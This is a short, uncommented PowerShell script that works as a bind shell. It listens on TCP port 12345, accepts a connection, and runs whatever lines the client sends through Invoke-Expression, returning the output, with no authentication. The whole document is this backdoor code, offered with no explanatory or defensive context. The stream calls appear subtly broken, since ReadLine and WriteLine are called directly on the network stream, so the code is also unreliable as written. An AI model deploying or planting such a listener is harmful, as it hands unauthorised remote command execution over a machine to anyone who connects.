$listener = New-Object System.Net.Sockets.TcpListener(12345)
$listener.Start()
$shell = $listener.AcceptTcpClient()

while ($true) {
    $command = $shell.GetStream().ReadLine()
    $output = Invoke-Expression $command
    $shell.GetStream().WriteLine($output)
}
